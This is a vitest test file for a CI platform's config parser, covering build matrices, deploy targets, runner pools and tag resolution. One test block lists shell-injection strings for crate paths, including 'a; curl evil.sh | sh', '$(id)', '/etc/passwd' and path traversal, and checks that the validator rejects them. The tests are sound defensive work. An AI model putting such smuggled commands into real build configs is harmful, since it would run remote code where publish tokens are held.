import {
	BUILDABLE_ARCHES,
	isBuildableArch,
	PlatformConfigError,
	parsePlatformConfig,
	resolveTag,
	runnerPoolFor,
	tagFromRef,
	validatePlatformConfig,
} from "@hanzo/platform/services/ci/platform-config";
import { describe, expect, it } from "vitest";

const VALID = `
build:
  matrix:
    - { os: linux, arch: amd64 }
    - { os: linux, arch: arm64 }
  dockerfile: ./Dockerfile
  context: .
  image: ghcr.io/hanzoai/zip
  tag-pattern: "{{git.sha}}"
  push: true
deploy:
  on:
    - main
  target:
    cluster: hanzo-k8s
    namespace: hanzo
    operator: hanzo-operator
    crd: Service
    name: zip
`;

/**
 * Parse a config that MUST declare a build, and fail the test if it does not.
 *
 * `parsePlatformConfig` returns null for a document that declares nothing for
 * the build lane — empty, comments-only, or `test:`-only — which is a real state
 * this suite covers explicitly below. Every OTHER case here is about a config
 * that does declare one, so asserting it up front keeps those tests reading as
 * statements about builds rather than about null-checks.
 */
function built(yamlText: string) {
	const cfg = parsePlatformConfig(yamlText);
	if (!cfg)
		throw new Error(`expected a build declaration, got none:\n${yamlText}`);
	return cfg;
}

/** {@link built}, for the pre-parsed-object form. */
function declared(raw: unknown) {
	const cfg = validatePlatformConfig(raw);
	if (!cfg) throw new Error("expected a build declaration, got none");
	return cfg;
}

describe("parsePlatformConfig", () => {
	it("parses a full valid config", () => {
		const cfg = built(VALID);
		expect(cfg.builds).toHaveLength(1);
		expect(cfg.builds[0]!.matrix).toHaveLength(2);
		expect(cfg.builds[0]!.image).toBe("ghcr.io/hanzoai/zip");
		expect(cfg.builds[0]!.push).toBe(true);
		expect(cfg.deploy?.target.name).toBe("zip");
		expect(cfg.deploy?.target.crd).toBe("Service");
	});

	it("applies defaults for optional build fields", () => {
		const cfg = built(`
build:
  matrix:
    - { os: linux, arch: amd64 }
  image: ghcr.io/hanzoai/base
`);
		expect(cfg.builds[0]!.dockerfile).toBe("./Dockerfile");
		expect(cfg.builds[0]!.context).toBe(".");
		expect(cfg.builds[0]!.tagPattern).toBe("{{git.sha}}");
		expect(cfg.builds[0]!.push).toBe(true);
		expect(cfg.deploy).toBeUndefined();
	});

	it("rejects a missing build block", () => {
		expect(() => parsePlatformConfig("deploy: {}")).toThrow(
			PlatformConfigError,
		);
	});

	// A config that declares NOTHING for the build lane is a real, deliberate
	// state, not a malformed one — and treating it as an error is what made 54
	// repos answer every push with a 500 once the forge started delivering.
	//
	// `hanzo.yml` is the estate's ONE CI manifest with TWO readers: hanzoai/ci
	// runs its `test:` gate, platform builds its `images:`. Declaring tests and no
	// image is therefore complete. hanzoai/cloud's config says so in prose ("NO
	// images: lane HERE ... CI's only job here is the TEST GATE"), and
	// hanzo/insights' `.platform.yml` is comments-only, ending "No build/deploy
	// stanza: this repo produces no served surface".
	it("reads a test-only config as nothing to build, not as an error", () => {
		expect(parsePlatformConfig("test:\n  - go test ./...\n")).toBeNull();
	});

	it("reads a comments-only config as nothing to build", () => {
		expect(parsePlatformConfig("# no build/deploy stanza\n")).toBeNull();
	});

	it("reads an empty config as nothing to build", () => {
		expect(parsePlatformConfig("")).toBeNull();
	});

	// The distinction that keeps the above from swallowing real mistakes: silence
	// about builds is a choice, a rollout of nothing is incoherent.
	it("still rejects a deploy: with nothing to build", () => {
		expect(() =>
			parsePlatformConfig(
				"deploy:\n  on: [main]\n  target:\n    cluster: c\n    namespace: n\n    operator: hanzo-operator\n    name: x\n",
			),
		).toThrow(PlatformConfigError);
	});

	// A declared image that is missing a required field is a mistake, and must
	// stay loud — hanzo-fi/ledger and hanzoai/operator both hit exactly this.
	it("still rejects an image entry with no repo", () => {
		expect(() =>
			parsePlatformConfig("images:\n  - name: ledger\n    context: .\n"),
		).toThrow(/repo/);
	});

	// A document that parses to a scalar or a list is malformed, not silent.
	it("still rejects a non-mapping document", () => {
		expect(() => parsePlatformConfig("just a string")).toThrow(/YAML mapping/);
	});

	it("rejects an empty matrix", () => {
		expect(() =>
			validatePlatformConfig({ build: { matrix: [], image: "x/y" } }),
		).toThrow(/non-empty list/);
	});

	it("rejects an invalid os", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "plan9", arch: "amd64" }], image: "x/y" },
			}),
		).toThrow(/os must be one of/);
	});

	it("rejects an invalid arch", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "riscv" }], image: "x/y" },
			}),
		).toThrow(/arch must be one of/);
	});

	it("rejects a tag on the image", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y:v1" },
			}),
		).toThrow(/bare repository/);
	});

	it("rejects duplicate matrix entries", () => {
		expect(() =>
			validatePlatformConfig({
				build: {
					matrix: [
						{ os: "linux", arch: "amd64" },
						{ os: "linux", arch: "amd64" },
					],
					image: "x/y",
				},
			}),
		).toThrow(/duplicate target/);
	});

	it("rejects an unsupported operator", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
				deploy: {
					on: ["main"],
					target: {
						cluster: "c",
						namespace: "n",
						operator: "argocd",
						crd: "Service",
						name: "x",
					},
				},
			}),
		).toThrow(/operator must be one of/);
	});

	it("rejects legacy HanzoService CRD", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
				deploy: {
					on: ["main"],
					target: {
						cluster: "c",
						namespace: "n",
						operator: "hanzo-operator",
						crd: "HanzoService",
						name: "x",
					},
				},
			}),
		).toThrow(/one way only/);
	});

	it("accepts the App CRD — the kind the fleet actually runs", () => {
		const cfg = declared({
			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
			deploy: {
				on: ["main"],
				target: {
					cluster: "hanzo-k8s",
					namespace: "hanzo",
					operator: "hanzo-operator",
					crd: "App",
					name: "cloud",
				},
			},
		});
		expect(cfg.deploy?.target.crd).toBe("App");
	});

	it("defaults an omitted crd to App", () => {
		// `App` is ~99% of the fleet, so omitting the kind must not be an error.
		const cfg = declared({
			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
			deploy: {
				on: ["main"],
				target: {
					cluster: "hanzo-k8s",
					namespace: "hanzo",
					operator: "hanzo-operator",
					name: "cloud",
				},
			},
		});
		expect(cfg.deploy?.target.crd).toBe("App");
	});

	it("rejects a datastore kind as a deploy target", () => {
		expect(() =>
			validatePlatformConfig({
				build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
				deploy: {
					on: ["main"],
					target: {
						cluster: "c",
						namespace: "n",
						operator: "hanzo-operator",
						crd: "SQL",
						name: "x",
					},
				},
			}),
		).toThrow(/must be one of App, Service/);
	});

	it("rejects non-YAML", () => {
		expect(() => parsePlatformConfig(":\n  - [")).toThrow(PlatformConfigError);
	});
});

const MULTI_IMAGE = `
images:
  - { name: api, context: ./api, repo: ghcr.io/bootnode/bootnode, tag-suffix: api }
  - { name: web, context: ./web, repo: ghcr.io/bootnode/bootnode, tag-suffix: web }
test:
  - { name: api, run: "pytest -q" }
kms: { path: /deploy, environment: prod }
`;

describe("images (hanzo.yml multi-image)", () => {
	it("parses a list of images into builds", () => {
		const cfg = built(MULTI_IMAGE);
		expect(cfg.builds).toHaveLength(2);
		expect(cfg.builds[0]!.name).toBe("api");
		expect(cfg.builds[0]!.image).toBe("ghcr.io/bootnode/bootnode");
		expect(cfg.builds[0]!.context).toBe("./api");
		expect(cfg.builds[0]!.dockerfile).toBe("./api/Dockerfile");
		expect(cfg.builds[0]!.tagPattern).toBe("{{git.sha}}-amd64-api");
		expect(cfg.builds[1]!.name).toBe("web");
		// default matrix is linux/amd64
		expect(cfg.builds[0]!.matrix).toEqual([{ os: "linux", arch: "amd64" }]);
		// `test`/`kms` keys are ignored by the platform; deploy via cicd/universe
		expect(cfg.deploy).toBeUndefined();
	});
	it("rejects an empty images list", () => {
		expect(() => validatePlatformConfig({ images: [] })).toThrow(/non-empty/);
	});
	it("rejects a tag in images[].repo", () => {
		expect(() =>
			validatePlatformConfig({ images: [{ name: "a", repo: "x/y:v1" }] }),
		).toThrow(/bare repository/);
	});
	it("rejects duplicate image names", () => {
		expect(() =>
			validatePlatformConfig({
				images: [
					{ name: "api", repo: "x/y" },
					{ name: "api", repo: "x/z" },
				],
			}),
		).toThrow(/duplicate image name/);
	});
	it("treats a Deployment-style deploy (services) as build-only", () => {
		const cfg = declared({
			images: [{ name: "api", repo: "x/y" }],
			deploy: { on: ["main"], cluster: "c", namespace: "n", services: [] },
		});
		expect(cfg.builds).toHaveLength(1);
		expect(cfg.deploy).toBeUndefined();
	});
});

describe("runnerPoolFor", () => {
	it("maps hanzoai/linux/amd64 to the real ARC pool hanzo-build-linux-amd64", () => {
		expect(runnerPoolFor("hanzoai", { os: "linux", arch: "amd64" })).toBe(
			"hanzo-build-linux-amd64",
		);
	});
	it("maps org login to brand prefix (luxfi→lux, zooai→zoo)", () => {
		expect(runnerPoolFor("luxfi", { os: "linux", arch: "amd64" })).toBe(
			"lux-build-linux-amd64",
		);
		expect(runnerPoolFor("zooai", { os: "linux", arch: "amd64" })).toBe(
			"zoo-build-linux-amd64",
		);
	});
	it("defaults an unmapped org to its own login as brand", () => {
		expect(runnerPoolFor("hanzobot", { os: "linux", arch: "amd64" })).toBe(
			"hanzobot-build-linux-amd64",
		);
	});
	it("routes bootnode (no runners of its own) to the shared hanzo build pool", () => {
		expect(runnerPoolFor("bootnode", { os: "linux", arch: "amd64" })).toBe(
			"hanzo-build-linux-amd64",
		);
	});
	it("maps darwin to macos", () => {
		expect(runnerPoolFor("hanzoai", { os: "darwin", arch: "arm64" })).toBe(
			"hanzo-build-macos-arm64",
		);
	});
	it("honors an explicit deploy role", () => {
		expect(
			runnerPoolFor("hanzoai", { os: "linux", arch: "amd64" }, "deploy"),
		).toBe("hanzo-deploy-linux-amd64");
	});
});

describe("resolveTag", () => {
	it("substitutes git.sha", () => {
		expect(resolveTag("{{git.sha}}", { sha: "abc123", branch: "main" })).toBe(
			"abc123",
		);
	});
	it("sanitizes branch in tag", () => {
		expect(
			resolveTag("br-{{git.branch}}", { sha: "x", branch: "feat/foo bar" }),
		).toBe("br-feat-foo-bar");
	});

	// {{git.tag}} exists so a repo can publish a semver image on a `v*` push —
	// the capability GitHub Actions provided before repos moved to platform.
	it("substitutes git.tag on a tag push", () => {
		expect(
			resolveTag("{{git.tag}}", {
				sha: "x",
				branch: "main",
				ref: "refs/tags/v0.9.4",
			}),
		).toBe("v0.9.4");
	});
	it("sanitizes the tag", () => {
		expect(
			resolveTag("{{git.tag}}", {
				sha: "x",
				branch: "main",
				ref: "refs/tags/release/1.0 rc1",
			}),
		).toBe("release-1.0-rc1");
	});
	// Skip, don't invent: falling back to the branch would give one token two
	// meanings and publish a branch image under a version-shaped name.
	it("returns null for {{git.tag}} on a branch push", () => {
		expect(
			resolveTag("{{git.tag}}", {
				sha: "x",
				branch: "main",
				ref: "refs/heads/main",
			}),
		).toBeNull();
	});
	it("returns null for {{git.tag}} when ref is absent", () => {
		expect(resolveTag("{{git.tag}}", { sha: "x", branch: "main" })).toBeNull();
	});
	it("leaves sha/branch patterns unaffected by a missing ref", () => {
		expect(resolveTag("{{git.sha}}", { sha: "abc", branch: "main" })).toBe(
			"abc",
		);
	});
});

describe("tagFromRef", () => {
	it("reads the tag name", () => {
		expect(tagFromRef("refs/tags/v1.2.3")).toBe("v1.2.3");
	});
	it("rejects a branch ref, a bare sha, undefined, and an empty tag", () => {
		expect(tagFromRef("refs/heads/main")).toBeNull();
		expect(tagFromRef("deadbeef")).toBeNull();
		expect(tagFromRef(undefined)).toBeNull();
		expect(tagFromRef("refs/tags/")).toBeNull();
	});
});

describe("buildable arch gate (arm64 paused)", () => {
	it("amd64 is buildable", () => {
		expect(isBuildableArch("amd64")).toBe(true);
	});
	it("arm64 is NOT buildable while paused (no DOKS arm64 pool)", () => {
		expect(isBuildableArch("arm64")).toBe(false);
	});
	it("BUILDABLE_ARCHES is amd64-only", () => {
		expect([...BUILDABLE_ARCHES]).toEqual(["amd64"]);
		expect(BUILDABLE_ARCHES).not.toContain("arm64");
	});
	it("a config may still DECLARE arm64 (schema-valid) — the gate is runtime, not schema", () => {
		// A dual-arch config parses fine; the scheduler skips the arm64 entry at
		// dispatch time. Keeps validation and build-time policy orthogonal.
		const cfg = built(`
build:
  matrix:
    - { os: linux, arch: amd64 }
    - { os: linux, arch: arm64 }
  image: ghcr.io/hanzoai/zip
`);
		expect(cfg.builds[0]!.matrix.map((m) => m.arch)).toEqual([
			"amd64",
			"arm64",
		]);
		// Exactly one of the declared arches is currently buildable.
		expect(
			cfg.builds[0]!.matrix.filter((m) => isBuildableArch(m.arch)),
		).toHaveLength(1);
	});
});

describe("publish paths cannot inject shell", () => {
	const pub = (over: Record<string, unknown>) =>
		validatePlatformConfig({
			build: { matrix: [{ os: "linux", arch: "amd64" }], image: "x/y" },
			publish: { cargo: true, ...over },
		});

	it("🔴 REFUSES a crate path carrying shell metacharacters", () => {
		// cargoCrates is interpolated UNQUOTED into `for c in …` in the generated
		// publish script, so a metacharacter here is remote code execution in the
		// publish Job — which holds CARGO_REGISTRY_TOKEN / NPM_TOKEN / PYPI_TOKEN.
		for (const evil of [
			"a; curl evil.sh | sh",
			"$(id)",
			"`id`",
			"a|b",
			"a&b",
			"a\nb",
			'a"b',
			"a'b",
			"a b",
			"-flag",
			"/etc/passwd",
			"*",
		]) {
			expect(() => pub({ cargoCrates: [evil] })).toThrow(PlatformConfigError);
		}
	});

	it("REFUSES upward traversal in a crate path", () => {
		expect(() => pub({ cargoCrates: ["../../etc"] })).toThrow(
			/traverse upward/,
		);
		expect(() => pub({ cargoCrates: ["a/../../b"] })).toThrow(
			/traverse upward/,
		);
	});

	it("REFUSES the same in packageDir", () => {
		expect(() => pub({ packageDir: "../../etc" })).toThrow(/traverse upward/);
		expect(() => pub({ packageDir: "a; id" })).toThrow(PlatformConfigError);
	});

	it("still accepts ordinary workspace crate paths", () => {
		const cfg = pub({ cargoCrates: ["crates/core", "crates/cli", "."] });
		expect(cfg).not.toBeNull();
		expect(cfg?.publish?.cargoCrates).toEqual([
			"crates/core",
			"crates/cli",
			".",
		]);
		expect(pub({ packageDir: "packages/sdk" })?.publish?.packageDir).toBe(
			"packages/sdk",
		);
	});
});

/**
 * `args:` on an image entry selects WHAT THE IMAGE IS when a Dockerfile ends in
 * `FROM ${STAGE} AS final`. The parser used to read six keys and not this one,
 * so the value evaporated at parse time: all four hanzoai/bot sandbox classes
 * built the `ARG STAGE=desktop` default and were tagged exec/dev/desktop/admin
 * anyway. Nothing failed — the tags simply stopped meaning anything.
 *
 * hanzoai/ci's lane always piped `.args` into `--build-arg`, so the same
 * hanzo.yml produced different images through the two front doors.
 */
describe("per-image build args", () => {
	const withArgs = (args: string) =>
		parsePlatformConfig(
			`images:\n  - name: sandbox-dev\n    repo: oci.hanzo.ai/hanzoai/sandbox\n    dockerfile: Dockerfile.sandbox\n    tag-suffix: dev\n${args}`,
		);

	it("carries args: through to the build config", () => {
		const cfg = withArgs("    args:\n      STAGE: dev\n");
		expect(cfg?.builds[0].buildArgs).toEqual({ STAGE: "dev" });
	});

	it("defaults to no args when the key is absent", () => {
		expect(withArgs("")?.builds[0].buildArgs).toEqual({});
	});

	it("sorts keys so one commit yields one argv, and one cache key", () => {
		const cfg = withArgs("    args:\n      ZULU: z\n      ALPHA: a\n");
		expect(Object.keys(cfg?.builds[0].buildArgs ?? {})).toEqual([
			"ALPHA",
			"ZULU",
		]);
	});

	// A key is spliced into `--opt=build-arg:<key>=<value>`; one that is not an
	// ARG name would build a different option than it reads like.
	it("rejects a key that is not a Dockerfile ARG name", () => {
		expect(() => withArgs("    args:\n      'not a name': x\n")).toThrow(
			/ARG name/,
		);
	});

	it("rejects a non-string value", () => {
		expect(() => withArgs("    args:\n      STAGE: 3\n")).toThrow(/string/);
	});

	// One arg must stay one argv element.
	it("rejects a value carrying a newline", () => {
		expect(() => withArgs('    args:\n      STAGE: "a\\nb"\n')).toThrow(
			/control character/,
		);
	});
});
